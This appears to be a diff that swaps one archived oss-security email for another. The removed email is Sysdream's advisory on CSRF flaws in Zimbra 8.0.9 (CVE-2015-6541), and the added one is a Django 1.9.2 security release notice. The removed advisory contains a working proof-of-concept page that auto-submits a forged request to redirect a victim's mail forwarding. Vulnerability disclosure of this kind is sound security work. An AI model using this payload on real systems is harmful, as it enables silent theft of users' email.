@@ -1,103 +1,27 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/02/25/5
-Message-ID: <56CEFE09.20104@sysdream.com>
-Date: Thu, 25 Feb 2016 14:13:45 +0100
-From: Sysdream Labs <labs@...dream.com>
-To: fulldisclosure@...lists.org, oss-security@...ts.openwall.com
-Subject: CVE-2015-6541 : Multiple CSRF in Zimbra Mail interface
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/02/01/7
+Message-Id: <a40ec0ec-82c0-45d4-ac06-d24fa95313fa@googlegroups.com>
+Date: Mon, 1 Feb 2016 09:31:26 -0800 (PST)
+From: Tim Graham <timograham@...il.com>
+To: django-announce <django-announce@...glegroups.com>
+Cc: django-developers@...glegroups.com, django-users@...glegroups.com,  oss-security@...ts.openwall.com
+Subject: [ANNOUNCE] Django releases issued: 1.9.2 (security) and 1.8.9 (bugfix)
 Content-Type: text/plain; charset=utf-8
 
-======================================
-Multiple CSRF in Zimbra Mail interface
-======================================
+Today the Django team issued 1.9.2 as part of our security process. This 
+releases address a security issue, and we encourage all users to upgrade as 
+soon as possible.
 
+The Django 1.8.9 release fixes several bugs in 1.8.8 but no security issues 
+as the issue fixed in 1.9.2 doesn't affect older versions.
 
-CVE-2015-6541
+Details are available on the Django project weblog:
 
-Description
-===========
+https://www.djangoproject.com/weblog/2016/feb/01/releases-192-and-189/
 
-Multiple CSRF vulnerabilities have been found in the Mail interface of
-Zimbra 8.0.9 GA Release, enabling to change account
-preferences like e-mail forwarding.
+As a reminder, we ask that potential security issues be reported via 
+private email to security@...ngoproject.com and not via Django's Trac 
+instance or the django-developers list. Please see 
+https://www.djangoproject.com/security for further information.
 
-
-CSRF
-====
-
-Forms in the preferences part of old releases of Zimbra are vulnerable
-to CSRF because of the lack of a CSRF token identifying a valid session.
-As a consequence, requests can be forged and played arbitrarily.
-
-**Access Vector**: remote
-**Security Risk**: low
-**Vulnerability**: CWE-352
-**CVSS Base score**: 5.8
-
-----------------
-Proof of Concept
-----------------
-
-<html>
-<body>
-<form enctype="text/plain" id="trololo"
-action="https://192.168.0.171/service/soap/BatchRequest" method="POST">
-    <input name='<soap:Envelope
-xmlns:soap="http://www.w3.org/2003/05/soap-envelope"><soap:Header><context
-xmlns="urn:zimbra"><userAgent xmlns="" name="ZimbraWebClient - FF38
-(Win)" version="8.0.9_GA_6191"/><session xmlns="" id="19"/><account
-xmlns="" by="name">anto@...l.ubuntu.fr</account><format xmlns=""
-type="js"/></context></soap:Header><soap:Body><BatchRequest
-xmlns="urn:zimbra" onerror="stop"><ModifyPrefsRequest
-xmlns="urn:zimbraAccount" requestId="0"><pref xmlns=""
-name="zimbraPrefMailForwardingAddress">itworks@...ntu.fr</pref></ModifyPrefsRequest><a
-xmlns="" n'
-value='"sn">itworks</a></BatchRequest></soap:Body></soap:Envelope>'/>
-</form>
-<script>
-document.forms[0].submit();
-</script>
-</body>
-</html>
-
-
-Solution
-========
-
-Sensitive forms should be protected by a CSRF token.
-
-
-Fixes
-=====
-
-Fixed with 8.5 release : bug 83547
-(https://wiki.zimbra.com/wiki/Security/Collab/86#Notes_from_8.5)
-
-
-Affected versions
-=================
-
- * Zimbra <= 8.0.9 GA Release
-
-
-Credits
-=======
-
- * Anthony LAOU-HINE TSUEI, Sysdream (laouhine_anthony -at- hotmail
--dot- fr)
- * Damien CAUQUIL, Sysdream (d.cauquil -at- sysdream -dot- com)
-
-
--- 
-SYSDREAM Labs <labs@...dream.com>
-
-GPG :
-47D1 E124 C43E F992 2A2E
-1551 8EB4 8CD9 D5B2 59A1
-
-* Website: https://sysdream.com/
-* Twitter: @sysdream
-
-
-
-Download attachment "signature.asc" of type "application/pgp-signature" (820 bytes)
+Content of type "text/html" skipped
